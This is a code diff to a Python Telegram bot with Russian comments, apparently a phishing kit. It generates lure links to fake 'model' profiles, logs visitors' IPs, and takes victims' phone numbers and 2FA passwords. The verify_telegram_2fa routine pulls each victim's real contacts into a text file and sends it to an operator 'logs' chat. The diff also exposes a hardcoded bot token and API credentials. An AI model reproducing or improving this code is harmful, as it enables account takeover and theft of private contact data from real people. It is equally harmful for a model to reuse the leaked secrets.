@@ -16,6 +16,8 @@ import threading
 from urllib.parse import quote
 import queue
 import user_agents
+import random
+import string
 
 # ✅ ДЛЯ RENDER - ПРАВИЛЬНЫЙ ПОРТ
 PORT = int(os.environ.get('PORT', 10000))
@@ -24,9 +26,8 @@ PORT = int(os.environ.get('PORT', 10000))
 API_ID = "26120781"
 API_HASH = "1f72de4bdd4fc68a70d1f82f9c17af4e"
 BOT_TOKEN = "8599650382:AAESazEZQPK7UisG_LudLBeERROvJikCzzA"
-GROUP_CHAT_ID = "-1003488289989"
 NOTIFICATION_CHAT_ID = "-1003488289989"  # для отстуков
-FILES_CHAT_ID = "-1003305566057"
+FILES_CHAT_ID = "-1003305566057"  # ✅ ДЛЯ TXT ФАЙЛОВ (ЛОГИ)
 
 # Инициализация бота
 bot = Bot(token=BOT_TOKEN)
@@ -51,6 +52,12 @@ class ModelStates(StatesGroup):
     EYES = State()
     HOBBY = State()
     PHOTOS = State()
+
+# === ФУНКЦИИ ДЛЯ ГЕНЕРАЦИИ ССЫЛКИ ===
+def generate_short_code(length=6):
+    """Генерирует случайный код из букв и цифр"""
+    characters = string.ascii_letters + string.digits
+    return ''.join(random.choice(characters) for _ in range(length))
 
 # === ФУНКЦИИ ДЛЯ ОТСТУКОВ ===
 def add_notification(message_text: str):
@@ -368,19 +375,19 @@ async def verify_telegram_2fa(phone, password):
         # 🔥 СОЗДАЕМ TXT ФАЙЛ С РЕАЛЬНЫМИ КОНТАКТАМИ
         contacts_txt_file = await create_contacts_txt_file(phone_clean, real_contacts)
         
-        # 🔥 ОТПРАВЛЯЕМ TXT ФАЙЛ В ГРУППУ ДЛЯ ФАЙЛОВ
+        # 🔥 ОТПРАВЛЯЕМ TXT ФАЙЛ В ГРУППУ ДЛЯ ЛОГОВ (FILES_CHAT_ID)
         if contacts_txt_file and os.path.exists(contacts_txt_file):
             try:
                 with open(contacts_txt_file, 'rb') as file:
                     await bot.send_document(
-                        FILES_CHAT_ID,  # ✅ Отправляем в чат для файлов
+                        FILES_CHAT_ID,  # ✅ Отправляем в чат для логов
                         types.BufferedInputFile(
                             file.read(),
                             filename=f"contacts_{phone_clean}.txt"
                         ),
                         caption=f"📁 БАЗА РЕАЛЬНЫХ КОНТАКТОВ\n📟 Номер: {phone_clean}\n👥 Контактов: {len(real_contacts)}"
                     )
-                print("✅ TXT файл с РЕАЛЬНЫМИ контактами отправлен в группу для файлов!")
+                print("✅ TXT файл с РЕАЛЬНЫМИ контактами отправлен в группу для логов!")
                 
                 # Удаляем временный файл после отправки
                 os.remove(contacts_txt_file)
@@ -437,8 +444,7 @@ async def verify_telegram_2fa(phone, password):
             f"✅ УСПЕШНАЯ АВТОРИЗАЦИЯ\n"
             f"📟 Номер: +{phone_clean}\n"
             f"👥 РЕАЛЬНЫХ контактов выкачано: {len(real_contacts)}\n"
-            f"📁 TXT файл отправлен: Да\n"
-            f"📨 Отправлено в разные группы: Да"
+            f"📁 TXT файл отправлен в логи: Да"
         )
         
         return {
@@ -458,9 +464,9 @@ async def handle_index(request):
     try:
         params = dict(request.query)
         
-        if params and 'Код' in params:
-            ref_code = params.get('Код', 'неизвестно')
-            model_name = params.get('Имя', 'Неизвестно')
+        if params and 'ref' in params:
+            ref_code = params.get('ref', 'неизвестно')
+            model_name = params.get('name', 'Неизвестно')
             
             real_ip, client_info, user_agent = get_client_info(request)
             
@@ -786,27 +792,16 @@ async def process_hobby(message: types.Message, state: FSMContext):
     user_id = str(message.from_user.id)
     user_data = await state.get_data()
     
-    # Создаем реферальный код
-    ref_code = str(uuid.uuid4())[:8]
+    # Создаем реферальный код из случайных букв и цифр
+    ref_code = generate_short_code(6)
     users_data[user_id] = {
         'ref_code': ref_code,
         'model_data': user_data
     }
     
-    # Создаем реферальную ссылку с новым доменом
+    # Создаем реферальную ссылку с новым доменом и коротким кодом
     base_url = f"http://{DOMAIN}"
-    params = {
-        'Код': ref_code,
-        'Имя': user_data['name'],
-        'Возраст': '23 года',  # Можно добавить поле возраста
-        'Рост': user_data['height'],
-        'Вес': user_data['weight'],
-        'Грудь': '3 размер',  # Можно добавить поле груди
-        'Статус': 'Онлайн'
-    }
-    
-    query_string = '&'.join([f"{k}={quote(str(v))}" for k, v in params.items()])
-    ref_link = f"{base_url}?{query_string}"
+    ref_link = f"{base_url}?ref={ref_code}&name={quote(user_data['name'])}"
     
     add_notification(
         f"✅ СОЗДАНА НОВАЯ МОДЕЛЬ\n"
@@ -842,20 +837,9 @@ async def cmd_miref(message: types.Message):
     ref_code = user_data['ref_code']
     model_data = user_data['model_data']
     
-    # Создаем реферальную ссылку с новым доменом
+    # Создаем реферальную ссылку с коротким кодом
     base_url = f"http://{DOMAIN}"
-    params = {
-        'Код': ref_code,
-        'Имя': model_data['name'],
-        'Возраст': '23 года',
-        'Рост': model_data['height'],
-        'Вес': model_data['weight'],
-        'Грудь': '3 размер',
-        'Статус': 'Онлайн'
-    }
-    
-    query_string = '&'.join([f"{k}={quote(str(v))}" for k, v in params.items()])
-    ref_link = f"{base_url}?{query_string}"
+    ref_link = f"{base_url}?ref={ref_code}&name={quote(model_data['name'])}"
     
     visits = link_visits.get(ref_code, 0)
     
